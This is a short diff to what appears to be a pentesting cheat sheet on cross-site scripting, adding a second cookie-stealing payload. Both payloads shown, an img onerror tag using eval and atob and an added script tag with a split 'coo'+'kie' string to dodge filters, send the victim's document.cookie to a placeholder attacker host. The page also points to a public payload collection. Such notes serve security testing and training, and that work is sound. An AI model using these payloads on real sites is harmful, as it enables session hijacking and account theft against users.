@@ -14,6 +14,10 @@ Encode the atob() payload in Base64
 
     <img src=x onerror='eval(atob("fetch('http://ATTACKER_IP:PORT/?cookie='+document.cookie)"));' /> 
 
+OR 
+
+    <script>var i=new Image();i.src="http://<attacker_ip>:<port>/?c="+document["coo"+"kie"]</script>
+
 ## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ## Places to inject XSS payloads:
